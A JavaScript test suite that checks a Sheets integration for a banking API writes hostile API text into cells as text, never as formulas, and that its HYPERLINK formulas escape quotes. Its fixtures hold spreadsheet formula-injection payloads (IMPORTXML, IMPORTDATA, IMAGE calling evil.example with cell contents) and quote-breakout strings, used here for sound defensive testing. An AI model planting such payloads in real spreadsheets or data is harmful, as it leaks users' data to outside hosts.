"use strict";

// What the flows that copy data into the sheets write with hostile data: nothing may be read as a formula.

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const {
  legitimate, transferFlow, chargeFlow, invoiceFlow, dictKeyFlow, dictKeys, statementFlow, chargePaymentFlow, customersFlow,
  paymentRequestFlow,
} = require("./support/listingFlows");
const {newLoginWorld} = require("./support/login");
const {unprotectedCalls, unauditedWrites, unescapedLinkFormulas, isSafeByForm} = require("./support/setValueAudit");
const {createScenarioRunner} = require("./support/scenarios");

const {scenario, run} = createScenarioRunner("Listings");

const srcDir = process.env.SDK_SRC_DIR || path.join(__dirname, "..", "src");
const HOSTILE = [
  '=IMPORTXML("https://evil.example/?x="&A1,"//a")',
  '+IMPORTDATA("https://evil.example/leak")',
  '-IMAGE("https://evil.example/?"&B2)',
  "=1+1",
];

function formulaCells(world, sheetName) {
  const sheet = world.workbook.getSheetByName(sheetName);
  return Array.from(sheet.formulaCells).sort();
}

function textOf(world, sheetName, key) {
  return world.workbook.getSheetByName(sheetName).cells.get(key);
}

scenario("transfers: hostile API text stays text", () => {
  const data = HOSTILE.map((hostile, index) => ({
    ...legitimate.transfers[0], id: String(9000 + index), name: hostile, taxId: hostile, bankCode: hostile,
    branchCode: hostile, accountNumber: hostile, transactionIds: [hostile, "t2"],
  }));

  const world = transferFlow(data);

  assert.deepEqual(formulaCells(world, "Consulta de Transferência"), []);
  HOSTILE.forEach((hostile, index) => {
    const row = 11 + index;
    assert.equal(textOf(world, "Consulta de Transferência", `${row},5`), hostile);
    assert.equal(textOf(world, "Consulta de Transferência", `${row},10`), `${hostile},t2`);
  });
});

scenario("boletos: hostile API text stays text and cannot break out of the link formula", () => {
  const data = HOSTILE.map((hostile, index) => ({
    ...legitimate.boletos[0], name: hostile, taxId: hostile, line: hostile, tags: [hostile], id: String(8000 + index),
  }));
  data.push({...legitimate.boletos[0], id: '1"), IMPORTDATA("https://evil.example/leak") //'});

  const world = chargeFlow(data);

  const formulas = formulaCells(world, "Consulta de Boleto");
  assert.deepEqual(formulas, data.map((item, index) => `${11 + index},11`));
  HOSTILE.forEach((hostile, index) => {
    assert.equal(textOf(world, "Consulta de Boleto", `${11 + index},2`), hostile);
    assert.equal(textOf(world, "Consulta de Boleto", `${11 + index},7`), hostile);
    assert.equal(textOf(world, "Consulta de Boleto", `${11 + index},10`), hostile);
  });
  assert.equal(
    textOf(world, "Consulta de Boleto", `${11 + HOSTILE.length},11`),
    '=HYPERLINK("https://sandbox.api.starkbank.com/v2/boleto/1""), IMPORTDATA(""https://evil.example/leak"") //' + '/pdf", "PDF")'
  );
});

scenario("invoices: hostile API text stays text and cannot break out of the link formula", () => {
  const data = HOSTILE.map((hostile, index) => ({
    ...legitimate.invoices[0], name: hostile, taxId: hostile, brcode: hostile, tags: [hostile], id: String(7000 + index),
  }));
  data.push({...legitimate.invoices[0], pdf: 'https://example.com/x"), IMPORTDATA("https://evil.example/leak") //'});

  const world = invoiceFlow(data);

  assert.deepEqual(formulaCells(world, "Consulta de Invoices Emitidas"), data.map((item, index) => `${11 + index},16`));
  HOSTILE.forEach((hostile, index) => {
    assert.equal(textOf(world, "Consulta de Invoices Emitidas", `${11 + index},2`), hostile);
    assert.equal(textOf(world, "Consulta de Invoices Emitidas", `${11 + index},12`), hostile);
  });
  assert.equal(
    textOf(world, "Consulta de Invoices Emitidas", `${11 + HOSTILE.length},16`),
    '=HYPERLINK("https://example.com/x""), IMPORTDATA(""https://evil.example/leak"") //", "PDF")'
  );
});

scenario("payment requests: hostile API text stays text for every payment type", () => {
  const hostile = HOSTILE[0];
  const data = legitimate.paymentRequests.map((request, index) => ({
    ...request, description: HOSTILE[index % HOSTILE.length], id: `${HOSTILE[(index + 1) % HOSTILE.length]}`, tags: [hostile],
    actions: [{name: "Criador"}, {name: HOSTILE[(index + 2) % HOSTILE.length]}],
    payment: Object.fromEntries(Object.entries(request.payment).map(([key, value]) => [key, value === null ? null : hostile])),
  }));

  const world = paymentRequestFlow(data);

  assert.deepEqual(formulaCells(world, "Consulta de Aprovações"), []);
  const stored = world.workbook.getSheetByName("Consulta de Aprovações").allValues();
  for (const value of HOSTILE) assert.ok(stored.includes(value), `${value} was not stored as text`);
  assert.ok(stored.includes(hostile));
});

scenario("statement: hostile API text stays text", () => {
  const data = HOSTILE.map((hostile, index) => ({...legitimate.transactions[0], id: hostile, description: hostile, tags: [hostile, "x"]}));

  const world = statementFlow(data);

  assert.deepEqual(formulaCells(world, "Extrato"), []);
  HOSTILE.forEach((hostile, index) => {
    assert.equal(textOf(world, "Extrato", `${11 + index},5`), hostile);
    assert.equal(textOf(world, "Extrato", `${11 + index},6`), hostile);
    assert.equal(textOf(world, "Extrato", `${11 + index},8`), `${hostile},x`);
  });
});

scenario("charge payments: hostile API text stays text", () => {
  const data = HOSTILE.map(hostile => ({...legitimate.chargePayments[0], description: hostile, id: hostile, line: hostile, tags: [hostile]}));

  const world = chargePaymentFlow(data);

  assert.deepEqual(formulaCells(world, "Consulta de Pagamento Boleto"), []);
  const sheet = world.workbook.getSheetByName("Consulta de Pagamento Boleto");
  const stored = sheet.allValues();
  for (const hostile of HOSTILE) assert.ok(stored.includes(hostile), `${hostile} was not stored as text`);
});

scenario("customers: hostile API text stays text", () => {
  const hostileAddress = hostile => ({streetLine1: hostile, streetLine2: hostile, district: hostile, city: hostile, stateCode: hostile, zipCode: hostile});
  const data = HOSTILE.map(hostile => ({
    ...legitimate.customers[0], id: hostile, name: hostile, taxId: hostile, email: hostile, phone: hostile, address: hostileAddress(hostile), tags: [hostile],
  }));

  const world = customersFlow(data);

  assert.deepEqual(formulaCells(world, "Consulta de Clientes"), []);
  HOSTILE.forEach((hostile, index) => {
    for (let column = 1; column <= 12; column++) {
      assert.equal(textOf(world, "Consulta de Clientes", `${11 + index},${column}`), hostile, `column ${column}`);
    }
  });
});

scenario("pix keys: hostile names and hostile text copied between cells stay text", () => {
  const hostile = HOSTILE[0];
  const keys = {
    ...dictKeys,
    "a@b.com": {key: {...dictKeys["a@b.com"].key, name: hostile, taxId: HOSTILE[1], accountNumber: HOSTILE[2], type: HOSTILE[3]}},
  };

  const world = dictKeyFlow(keys, {description: `'${HOSTILE[1]}`, display: `'${HOSTILE[2]}`});

  assert.deepEqual(formulaCells(world, "Consulta de Chave PIX"), []);
  assert.deepEqual(formulaCells(world, "Transferência com Aprovação"), []);
  assert.equal(textOf(world, "Consulta de Chave PIX", "11,6"), hostile);
  assert.equal(textOf(world, "Transferência com Aprovação", "11,1"), hostile);
  assert.equal(textOf(world, "Transferência com Aprovação", "13,10"), HOSTILE[1]);
  assert.equal(textOf(world, "Transferência com Aprovação", "13,11"), HOSTILE[2]);
});

scenario("safeText leaves everything that is not a formula exactly as it was", () => {
  const world = newLoginWorld();
  const benign = [
    "", "José da Silva & Filhos", "O'Brien", '"aspas"', "100%", "R$ 1.234,56", "-", "--", "- 10%", "-10.5", "+55 (11) 99999-9999",
    "+5511999999999", "+1+2", "-(1)", "@handle", "a=b", "x+y", "2024-03-05", "12.345.678/0001-90", "34191.09008 61207",
    "https://example.com/a?b=c", "texto com = no meio", "  =espaço antes", "'já com apóstrofo", "1e5", "0", "false",
  ];

  for (const value of benign) {
    assert.equal(world.evaluate(`safeText(${JSON.stringify(value)})`), value, `changed ${JSON.stringify(value)}`);
  }
  for (const value of [0, 1, -3, 12.5, true, false, null]) {
    assert.equal(world.evaluate(`safeText(${JSON.stringify(value)})`), value);
  }
  assert.equal(world.evaluate("safeText(undefined)"), undefined);
  assert.equal(world.evaluate("typeof safeText(new Date(0))"), "object");
});

scenario("names that start with + or - are written as text", () => {
  // Sheets may read "-Beltrano (filial)" as a formula; written as text it shows exactly what the API sent.
  const keys = {...dictKeys, "a@b.com": {key: {...dictKeys["a@b.com"].key, name: "-Beltrano (filial)"}}};

  const world = dictKeyFlow(keys);

  assert.deepEqual(formulaCells(world, "Consulta de Chave PIX"), []);
  assert.equal(textOf(world, "Consulta de Chave PIX", "11,6"), "-Beltrano (filial)");
});

scenario("safeText neutralizes what Sheets would read as a formula", () => {
  const world = newLoginWorld();
  const hostile = [
    ...HOSTILE, "=", "=A1", '= "x"', "+SUM(A1:A2)", "-cmd('x')", "+ IMPORTXML(1)", "-foo.bar(1)", "-Loja do Zé (matriz)", "-Nome",
    '+(IMPORTXML("https://evil.example/?x="&A1,"//a"))', '-(IMAGE("https://evil.example/?"&B2))', '+1+IMPORTXML("https://evil.example")',
    '-1&IMPORTDATA("https://evil.example")', '+A1&IMPORTXML("https://evil.example")', '-"a"&IMAGE("https://evil.example")',
  ];

  for (const value of hostile) {
    assert.equal(world.evaluate(`safeText(${JSON.stringify(value)})`), `'${value}`, `not neutralized: ${value}`);
  }
});

function sourceFiles() {
  return fs.readdirSync(srcDir).filter(file => file.endsWith(".js") && !file.startsWith("ecdsa"))
    .map(file => ({file, code: fs.readFileSync(path.join(srcDir, file), "utf8")}));
}

scenario("every cell write of text that may come from outside goes through safeText", () => {
  const missing = [];
  for (const {file, code} of sourceFiles()) {
    for (const call of unprotectedCalls(code, file)) missing.push(`${file}: setValue(${call.argument.trim()})`);
  }
  assert.deepEqual(missing, []);
});

scenario("no other way of writing into cells escapes the audit", () => {
  const found = [];
  for (const {file, code} of sourceFiles()) {
    for (const write of unauditedWrites(code)) found.push(`${file}: ${write}`);
  }
  assert.deepEqual(found, []);
});

scenario("every link formula is made of fixed text, the environment hostname and escaped parts", () => {
  const problems = [];
  let checked = 0;
  for (const {file, code} of sourceFiles()) {
    checked += (code.match(/\bpdfLink\s*=/g) || []).length;
    for (const part of unescapedLinkFormulas(code)) problems.push(`${file}: ${part}`);
  }
  assert.ok(checked >= 3);
  assert.deepEqual(problems, []);
});

scenario("the audit itself catches the ways a write could slip through", () => {
  const audit = code => unprotectedCalls(code).length;
  const slips = [
    'sheet.getRange("A1").setValue("" + hostile)',
    'sheet.getRange("A1").setValue(condition ? "fixed" : hostile)',
    'sheet.getRange("A1").setValue(Math.max(1, 2) + hostile)',
    'sheet.getRange("A1").setValue (hostile)',
    'const url = "http://example.com"; sheet.getRange("A1").setValue(hostile)',
    'sheet.getRange("A1").setValue(\n  hostile\n)',
    'sheet.getRange("A1").setValue("=" + hostile)',
    'sheet.getRange("A1").setValue(stringToCurrency(x) + hostile)',
    'sheet.getRange("A1").setValue(`${hostile}`)',
  ];
  for (const code of slips) assert.equal(audit(code), 1, `not caught: ${code}`);

  const fine = [
    'sheet.getRange("A1").setValue(safeText(hostile))',
    'sheet.getRange("A1").setValue("Olá, " + user.name + "!")',
    'sheet.getRange("A1").setValue(stringToCurrency(x))',
    'sheet.getRange("A1").setValue(formatToLocalDatetime(x))',
    'sheet.getRange("A1").setValue(JSON.stringify(x))',
    'sheet.getRange("A1").setValue(null).setBackground("#fff")',
    'sheet.getRange("A1").setValue(pdfLink)',
    '// sheet.getRange("A1").setValue(hostile)\nsheet.getRange("A1").setValue(safeText(x)) // setValue(hostile)',
    '/* sheet.getRange("A1").setValue(hostile) */',
  ];
  for (const code of fine) assert.equal(audit(code), 0, `flagged: ${code}`);

  assert.equal(unauditedWrites('range.setValues([[hostile]])').length, 1);
  assert.ok(unauditedWrites('sheet.appendRow([hostile])').length === 1);
  assert.ok(unauditedWrites('const write = range["setValue"]; write(hostile)').length === 1);
  assert.ok(unauditedWrites('range.setValue.call(range, hostile)').length === 1);
  assert.deepEqual(unescapedLinkFormulas('let pdfLink = \'=HYPERLINK("\' + hostname + "/x/" + charge["id"] + \'", "PDF")\';'), ['charge["id"]']);
  assert.deepEqual(unescapedLinkFormulas('let pdfLink = \'=HYPERLINK("\' + hostname + "/x/" + formulaText(charge["id"]) + \'", "PDF")\';'), []);
  assert.equal(isSafeByForm('"" + x'), false);
});

scenario("the link formulas escape quotes in the parts they receive", () => {
  const world = newLoginWorld();

  assert.equal(world.evaluate('formulaText(\'a"b""c\')'), 'a""b""""c');
  assert.equal(world.evaluate("formulaText(123)"), "123");
});

run();
